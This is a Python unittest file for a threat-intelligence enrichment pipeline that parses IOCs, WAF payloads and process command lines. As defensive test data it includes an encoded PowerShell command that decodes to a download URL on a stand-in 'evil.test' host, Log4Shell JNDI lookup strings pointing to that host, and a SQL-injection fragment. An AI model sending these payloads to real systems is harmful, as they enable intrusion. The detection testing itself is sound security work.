"""Tests for one full enrichment run in core.pipeline.

The ordering rules in this module are load-bearing and were previously
untestable — they lived inside app.py's `if run_requested:` block, reachable
only by driving Streamlit. Each one is pinned here.
"""
import unittest

from config import Settings
from core.orchestrator import PROVIDER_KEYS, RESULT_KEYS
from core.pipeline import EnrichmentInput, run_enrichment
from core.waf_payload_parser import parse_waf_field
from ioc.parser import IOC, parse_iocs


EMPTY_RESULTS = {key: {} for key in RESULT_KEYS.values()}
NO_TIMINGS = {"providers": {}, "providers_total": 0.0}


def _stub_lookup(results=None, seen=None):
    """Build a provider-lookup stand-in that records what it was offered."""
    def _lookup(settings, provider_flags, payload_for, allow_urlscan_submit):
        if seen is not None:
            for provider in provider_flags:
                for entry in payload_for(provider):
                    seen.append((provider, *entry))
        return {**EMPTY_RESULTS, **(results or {})}, NO_TIMINGS
    return _lookup


def _allow_everything(items):
    return {ioc.type: set(PROVIDER_KEYS) for ioc in items}


def _run(inputs, allowed_for=_allow_everything, **kwargs):
    return run_enrichment(
        inputs, settings=Settings(), allowed_for=allowed_for,
        lookup=kwargs.pop("lookup", _stub_lookup()), **kwargs,
    )


class TestEmptyInput(unittest.TestCase):
    def test_nothing_supplied_is_empty(self):
        self.assertTrue(EnrichmentInput().is_empty)

    def test_iocs_alone_are_not_empty(self):
        self.assertFalse(EnrichmentInput(items=parse_iocs("8.8.8.8")).is_empty)

    def test_context_alone_is_not_empty(self):
        """A Run on process context with an empty IOC box is legitimate."""
        for kwargs in (
            {"file_path": "C:/tmp/x.exe"},
            {"command_line": "powershell -enc AAA"},
            {"parent_process": "explorer.exe"},
            {"child_process": "cmd.exe"},
            {"waf_payloads": parse_waf_field("/a | ' OR 1=1--")},
        ):
            with self.subTest(**kwargs):
                self.assertFalse(EnrichmentInput(**kwargs).is_empty)

    def test_whitespace_only_context_is_still_empty(self):
        self.assertTrue(EnrichmentInput(file_path="   ", command_line="\t").is_empty)


class TestResultShape(unittest.TestCase):
    def test_every_provider_result_key_is_present(self):
        result = _run(EnrichmentInput(items=parse_iocs("8.8.8.8")))
        for key in RESULT_KEYS.values():
            with self.subTest(key=key):
                self.assertIn(key, result)

    def test_carries_the_blocks_the_result_tab_renders(self):
        result = _run(EnrichmentInput(items=parse_iocs("8.8.8.8")))
        for key in ("items", "summary", "rows", "provider_flags", "timings",
                    "waf_analysis", "waf_flags", "waf_rows",
                    "process_analysis", "process_flags", "process_rows",
                    "cmdline_analysis", "cmdline_flags", "allowed_by_type"):
            with self.subTest(key=key):
                self.assertIn(key, result)

    def test_allowed_by_type_is_serialisable(self):
        """Stored in session state and rendered — sets would not survive either."""
        result = _run(EnrichmentInput(items=parse_iocs("8.8.8.8")))
        for providers in result["allowed_by_type"].values():
            self.assertIsInstance(providers, list)
            self.assertEqual(providers, sorted(providers))


class TestLocalAnalysisFeedsProviders(unittest.TestCase):
    """Process analysis runs before dispatch so Context hashes get enriched."""

    HASH = "44d88612fea8a8f36de82e1278abb02f"

    def test_hash_found_in_context_is_dispatched_to_providers(self):
        seen = []
        result = _run(
            EnrichmentInput(context=f"dropped file {self.HASH} on disk"),
            lookup=_stub_lookup(seen=seen),
        )

        self.assertIn(self.HASH, [i.value for i in result["items"]])
        self.assertIn(self.HASH, [value for _, value, _, _ in seen])

    def test_context_hash_already_in_the_ioc_box_is_not_duplicated(self):
        result = _run(EnrichmentInput(
            items=parse_iocs(self.HASH), context=f"see {self.HASH}",
        ))
        values = [i.value for i in result["items"]]
        self.assertEqual(values.count(self.HASH), 1)

    def test_provider_verdict_on_a_context_hash_feeds_the_process_aggregate(self):
        """Layer 3 close-out: the hash verdict only exists after dispatch."""
        vt_hit = {self.HASH: {"stats": {"malicious": 9, "harmless": 60}}}
        result = _run(
            EnrichmentInput(context=f"dropped {self.HASH}"),
            lookup=_stub_lookup(results={"vt": vt_hit}),
        )

        hash_verdict = result["process_analysis"]["hash_verdict"]
        self.assertIsNotNone(hash_verdict)
        self.assertEqual(hash_verdict["artifact"], self.HASH)
        self.assertEqual(hash_verdict["verdict"], "Malicious")

    def test_a_clean_context_hash_leaves_the_aggregate_alone(self):
        result = _run(EnrichmentInput(context=f"dropped {self.HASH}"))
        self.assertIsNone(result["process_analysis"]["hash_verdict"])


class TestDecodedUrlIsNeverSubmitted(unittest.TestCase):
    """A URL recovered from a decoded payload must not reach URLScan's queue."""

    # base64 of "http://evil.test/payload" inside a PowerShell -enc command.
    CMD = (
        "powershell -nop -enc "
        "aAB0AHQAcAA6AC8ALwBlAHYAaQBsAC4AdABlAHMAdAAvAHAAYQB5AGwAbwBhAGQA"
    )

    def _dispatch(self):
        seen = []
        result = _run(EnrichmentInput(command_line=self.CMD), lookup=_stub_lookup(seen=seen))
        return result, seen

    def test_decoded_url_is_recovered_into_the_ioc_list(self):
        result, _ = self._dispatch()
        urls = [i.value for i in result["items"] if i.type == "url"]
        self.assertTrue(
            any("evil.test" in u for u in urls),
            f"no decoded URL recovered, got {[i.value for i in result['items']]}",
        )

    def test_decoded_url_is_withheld_from_urlscan_but_not_from_others(self):
        result, seen = self._dispatch()
        derived = [i.value for i in result["items"] if i.type == "url" and "evil.test" in i.value]
        if not derived:
            self.skipTest("command-line decoder recovered no URL to check")

        offered_to_urlscan = {v for p, v, _, _ in seen if p == "urlscan"}
        offered_to_vt = {v for p, v, _, _ in seen if p == "vt"}
        for url in derived:
            self.assertNotIn(url, offered_to_urlscan)
            self.assertIn(url, offered_to_vt)

    def test_a_url_the_analyst_typed_is_still_submitted(self):
        """Only *derived* URLs are held back — a typed one is the analyst's call."""
        seen = []
        _run(
            EnrichmentInput(items=parse_iocs("http://typed.test/a")),
            lookup=_stub_lookup(seen=seen),
        )
        self.assertIn(
            "http://typed.test/a", {v for p, v, _, _ in seen if p == "urlscan"}
        )


class TestProviderSelection(unittest.TestCase):
    def test_allowed_for_receives_the_final_item_list(self):
        """It must see the recovered IOCs, not just what the analyst typed."""
        captured = []

        def _allowed_for(items):
            captured.append([i.value for i in items])
            return _allow_everything(items)

        _run(
            EnrichmentInput(
                items=parse_iocs("8.8.8.8"),
                context="dropped 44d88612fea8a8f36de82e1278abb02f",
            ),
            allowed_for=_allowed_for,
        )

        self.assertEqual(len(captured), 1)
        self.assertIn("8.8.8.8", captured[0])
        self.assertIn("44d88612fea8a8f36de82e1278abb02f", captured[0])

    def test_a_provider_with_no_permitted_ioc_is_flagged_off(self):
        result = _run(
            EnrichmentInput(items=parse_iocs("8.8.8.8")),
            allowed_for=lambda items: {"ip": {"vt"}},
        )
        self.assertTrue(result["provider_flags"]["vt"])
        self.assertFalse(result["provider_flags"]["urlscan"])

    def test_nothing_is_dispatched_when_no_provider_is_allowed(self):
        seen = []
        result = _run(
            EnrichmentInput(items=parse_iocs("8.8.8.8")),
            allowed_for=lambda items: {},
            lookup=_stub_lookup(seen=seen),
        )
        self.assertEqual(seen, [])
        self.assertFalse(any(result["provider_flags"].values()))

    def test_scheme_inferred_flag_is_carried_into_the_payload(self):
        seen = []
        _run(EnrichmentInput(items=parse_iocs("example.com/login")), lookup=_stub_lookup(seen=seen))
        vt_entries = [(v, t, inf) for p, v, t, inf in seen if p == "vt"]
        self.assertTrue(any(inf for _, _, inf in vt_entries))


class TestCveDecoration(unittest.TestCase):
    PAYLOAD = "/api/data | ${jndi:ldap://evil.test/a}"

    def _fingerprint(self, **kwargs):
        result = _run(EnrichmentInput(waf_payloads=parse_waf_field(self.PAYLOAD)), **kwargs)
        return result["waf_analysis"][0]["cve_fingerprint_match"]

    def test_a_matched_fingerprint_is_decorated_with_the_record(self):
        fingerprint = self._fingerprint(
            cve_lookup=lambda cve_id: {"severity": "CRITICAL", "isKev": True}
        )
        self.assertEqual(fingerprint["cve"], "CVE-2021-44228")
        self.assertEqual(fingerprint["nvd"]["severity"], "CRITICAL")
        self.assertTrue(fingerprint["kev"])

    def test_a_failed_lookup_reads_as_not_retrieved_not_as_not_exploited(self):
        """D4: the offline verdict must never depend on the lookup succeeding."""
        fingerprint = self._fingerprint(cve_lookup=lambda cve_id: None)
        self.assertIsNone(fingerprint["nvd"])
        self.assertIsNone(fingerprint["kev"], "None means 'not retrieved'; False would lie")

    def test_the_lookup_is_optional(self):
        fingerprint = self._fingerprint()
        self.assertEqual(fingerprint["cve"], "CVE-2021-44228")

    def test_the_same_cve_is_looked_up_once_per_run(self):
        calls = []
        two = f"{self.PAYLOAD}\n/other | ${{jndi:rmi://evil.test/b}}"
        _run(
            EnrichmentInput(waf_payloads=parse_waf_field(two)),
            cve_lookup=lambda cve_id: calls.append(cve_id) or {"isKev": False},
        )
        self.assertEqual(calls, ["CVE-2021-44228"])


if __name__ == "__main__":
    unittest.main()
